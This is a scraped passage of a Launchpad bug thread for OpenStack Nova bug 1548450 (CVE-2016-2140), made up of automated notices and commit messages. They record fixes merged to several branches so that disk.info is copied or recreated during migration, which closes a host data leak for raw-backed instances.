  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Host data leak during resize/migrate for raw-backed instances<br />- (CVE-2016-2140)<br />+ [OSSA 2016-007] Host data leak during resize/migrate for raw-backed<br />+ instances (CVE-2016-2140)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/60" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T15:05:58.682472+00:00" title="2016-03-08 15:05:58 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/60">
                <strong>Fix proposed to nova (stable/kilo)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/60"> #60</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/kilo<br />
Review: <a rel="nofollow" href="https://review.openstack.org/289960">https:/<wbr />/review.<wbr />openstack.<wbr />org/289960</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/289960</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/61" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T15:06:18.959353+00:00" title="2016-03-08 15:06:18 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/61">
                <strong>Related fix proposed to ossa (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/61"> #61</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.openstack.org/289961">https:/<wbr />/review.<wbr />openstack.<wbr />org/289961</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: master
Review: https://review.openstack.org/289961</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-08 15:23:18 UTC" datetime="2016-03-08T15:23:18.131200+00:00">on 2016-03-08</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/62" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T20:22:46.639159+00:00" title="2016-03-08 20:22:46 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/62">
                <strong>Related fix merged to ossa (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/62"> #62</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/289961">https:/<wbr />/review.<wbr />openstack.<wbr />org/289961</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />ossa/commit/<wbr />?id=51a4f35c3ea<wbr />a700e80d6611db7<wbr />e4b2c85bc82f8b</a><br />
Submitter: Jenkins<br />
Branch:    master</p>
<p>commit 51a4f35c3eaa700<wbr />e80d6611db7e4b2<wbr />c85bc82f8b<br />
Author: Tristan Cacqueray &lt;email address hidden&gt;<br />
Date:   Tue Mar 8 10:05:25 2016 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Adds OSSA 2016-007 (CVE-2016-2140)</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I95d3a2211e25e7<wbr />e121b4a67a729e4<wbr />c4364eb1118<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #1548450</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/289961
Committed: https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Submitter: Jenkins
Branch:    master

commit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Author: Tristan Cacqueray &lt;tdecacqu@redhat.com&gt;
Date:   Tue Mar 8 10:05:25 2016 -0500

    Adds OSSA 2016-007 (CVE-2016-2140)
    
    Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118
    Related-Bug: #1548450
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/63" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-09T12:59:05.321842+00:00" title="2016-03-09 12:59:05 UTC">on 2016-03-09</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/63">
                <strong>Fix merged to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/63"> #63</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/289957">https:/<wbr />/review.<wbr />openstack.<wbr />org/289957</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />nova/commit/<wbr />?id=116b1210ab7<wbr />72c55d1ed1f7156<wbr />87d83877c92701</a><br />
Submitter: Jenkins<br />
Branch:    master</p>
<p>commit 116b1210ab772c5<wbr />5d1ed1f715687d8<wbr />3877c92701<br />
Author: Lee Yarwood &lt;email address hidden&gt;<br />
Date:   Wed Feb 24 11:23:22 2016 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;libvirt: Always copy or recreate disk.info during a migration</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The disk.info file contains the path and format of any image, config or<br />
&nbsp;&nbsp;&nbsp;&nbsp;ephermal disk associated with an instance. When using RAW images and migrating<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance this file should always be copied or recreated. This avoids the Raw<br />
&nbsp;&nbsp;&nbsp;&nbsp;imagebackend reinspecting the format of these disks when spawning the instance<br />
&nbsp;&nbsp;&nbsp;&nbsp;on the destination host.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;By not copying or recreating this disk.info file, a malicious image written to<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance disk on the source host will cause Nova to reinspect and record a<br />
&nbsp;&nbsp;&nbsp;&nbsp;different format for the disk on the destination. This format then being used<br />
&nbsp;&nbsp;&nbsp;&nbsp;incorrectly when finally spawning the instance on the destination.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;SecurityImpact<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #1548450<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Idfc16f54049aae<wbr />ab31ac1c1d8d79a<wbr />129acc9fb87</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/289957
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701
Submitter: Jenkins
Branch:    master

commit 116b1210ab772c55d1ed1f715687d83877c92701
Author: Lee Yarwood &lt;lyarwood@redhat.com&gt;
Date:   Wed Feb 24 11:23:22 2016 +0000

    libvirt: Always copy or recreate disk.info during a migration
    
    The disk.info file contains the path and format of any image, config or
    ephermal disk associated with an instance. When using RAW images and migrating
    an instance this file should always be copied or recreated. This avoids the Raw
    imagebackend reinspecting the format of these disks when spawning the instance
    on the destination host.
    
    By not copying or recreating this disk.info file, a malicious image written to
    an instance disk on the source host will cause Nova to reinspect and record a
    different format for the disk on the destination. This format then being used
    incorrectly when finally spawning the instance on the destination.
    
    SecurityImpact
    Closes-bug: #1548450
    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/64" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T01:59:45.355910+00:00" title="2016-03-10 01:59:45 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/64">
                <strong>Fix merged to nova (stable/liberty)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/64"> #64</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/289958">https:/<wbr />/review.<wbr />openstack.<wbr />org/289958</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />nova/commit/<wbr />?id=8d5ba34751c<wbr />0ae8093f987d743<wbr />48dffd8ca0b61c</a><br />
Submitter: Jenkins<br />
Branch:    stable/liberty</p>
<p>commit 8d5ba34751c0ae8<wbr />093f987d74348df<wbr />fd8ca0b61c<br />
Author: Lee Yarwood &lt;email address hidden&gt;<br />
Date:   Wed Feb 24 11:23:22 2016 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;libvirt: Always copy or recreate disk.info during a migration</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The disk.info file contains the path and format of any image, config or<br />
&nbsp;&nbsp;&nbsp;&nbsp;ephermal disk associated with an instance. When using RAW images and migrating<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance this file should always be copied or recreated. This avoids the Raw<br />
&nbsp;&nbsp;&nbsp;&nbsp;imagebackend reinspecting the format of these disks when spawning the instance<br />
&nbsp;&nbsp;&nbsp;&nbsp;on the destination host.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;By not copying or recreating this disk.info file, a malicious image written to<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance disk on the source host will cause Nova to reinspect and record a<br />
&nbsp;&nbsp;&nbsp;&nbsp;different format for the disk on the destination. This format then being used<br />
&nbsp;&nbsp;&nbsp;&nbsp;incorrectly when finally spawning the instance on the destination.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;SecurityImpact<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #1548450<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Idfc16f54049aae<wbr />ab31ac1c1d8d79a<wbr />129acc9fb87</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/289958
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Submitter: Jenkins
Branch:    stable/liberty

commit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Author: Lee Yarwood &lt;lyarwood@redhat.com&gt;
Date:   Wed Feb 24 11:23:22 2016 +0000

    libvirt: Always copy or recreate disk.info during a migration
    
    The disk.info file contains the path and format of any image, config or
    ephermal disk associated with an instance. When using RAW images and migrating
    an instance this file should always be copied or recreated. This avoids the Raw
    imagebackend reinspecting the format of these disks when spawning the instance
    on the destination host.
    
    By not copying or recreating this disk.info file, a malicious image written to
    an instance disk on the source host will cause Nova to reinspect and record a
    different format for the disk on the destination. This format then being used
    incorrectly when finally spawning the instance on the destination.
    
    SecurityImpact
    Closes-bug: #1548450
    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-stable-liberty
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/65" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T02:14:05.637217+00:00" title="2016-03-10 02:14:05 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/65">
                <strong>Fix merged to nova (stable/kilo)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/65"> #65</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/289960">https:/<wbr />/review.<wbr />openstack.<wbr />org/289960</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />nova/commit/<wbr />?id=f302bf04ab5<wbr />dda89cf8ceaeed3<wbr />09006da90c0666</a><br />
Submitter: Jenkins<br />
Branch:    stable/kilo</p>
<p>commit f302bf04ab5dda8<wbr />9cf8ceaeed30900<wbr />6da90c0666<br />
Author: Lee Yarwood &lt;email address hidden&gt;<br />
Date:   Wed Feb 24 11:23:22 2016 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;libvirt: Always copy or recreate disk.info during a migration</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The disk.info file contains the path and format of any image, config or<br />
&nbsp;&nbsp;&nbsp;&nbsp;ephermal disk associated with an instance. When using RAW images and migrating<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance this file should always be copied or recreated. This avoids the Raw<br />
&nbsp;&nbsp;&nbsp;&nbsp;imagebackend reinspecting the format of these disks when spawning the instance<br />
&nbsp;&nbsp;&nbsp;&nbsp;on the destination host.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;By not copying or recreating this disk.info file, a malicious image written to<br />
&nbsp;&nbsp;&nbsp;&nbsp;an instance disk on the source host will cause Nova to reinspect and record a<br />
&nbsp;&nbsp;&nbsp;&nbsp;different format for the disk on the destination. This format then being used<br />
&nbsp;&nbsp;&nbsp;&nbsp;incorrectly when finally spawning the instance on the destination.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Conflicts:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;nova/tests/<wbr />unit/virt/<wbr />libvirt/<wbr />test_driver.<wbr />py<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;SecurityImpact<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #1548450<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Idfc16f54049aae<wbr />ab31ac1c1d8d79a<wbr />129acc9fb87</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/289960
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666
Submitter: Jenkins
Branch:    stable/kilo

commit f302bf04ab5dda89cf8ceaeed309006da90c0666
Author: Lee Yarwood &lt;lyarwood@redhat.com&gt;
Date:   Wed Feb 24 11:23:22 2016 +0000

    libvirt: Always copy or recreate disk.info during a migration
    
    The disk.info file contains the path and format of any image, config or
    ephermal disk associated with an instance. When using RAW images and migrating
    an instance this file should always be copied or recreated. This avoids the Raw
    imagebackend reinspecting the format of these disks when spawning the instance
    on the destination host.
    
    By not copying or recreating this disk.info file, a malicious image written to
    an instance disk on the source host will cause Nova to reinspect and record a
    different format for the disk on the destination. This format then being used
    incorrectly when finally spawning the instance on the destination.
    
    Conflicts:
        nova/tests/unit/virt/libvirt/test_driver.py
        nova/virt/libvirt/driver.py
    
    SecurityImpact
    Closes-bug: #1548450
    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-stable-kilo
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/66" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T14:37:37.385568+00:00" title="2016-03-10 14:37:37 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/66">
                <strong>Related fix proposed to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/66"> #66</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.openstack.org/291208">https:/<wbr />/review.<wbr />openstack.<wbr />org/291208</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: master
Review: https://review.openstack.org/291208</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/67" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T15:08:20.810802+00:00" title="2016-03-10 15:08:20 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/67">
                <strong>Related fix proposed to nova (stable/liberty)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/67"> #67</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: stable/liberty<br />
Review: <a rel="nofollow" href="https://review.openstack.org/291221">https:/<wbr />/review.<wbr />openstack.<wbr />org/291221</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: stable/liberty
Review: https://review.openstack.org/291221</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~mriedem" class="sprite person">Matt Riedemann (mriedem)</a>
    
    <time title="2016-03-10 15:10:28 UTC" datetime="2016-03-10T15:10:28.210673+00:00">on 2016-03-10</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/68" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T17:00:12.339290+00:00" title="2016-03-10 17:00:12 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/68">
                <strong>Related fix merged to nova (stable/liberty)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/68"> #68</a>
          </td>
        </tr>
      </tbody>
    </table>
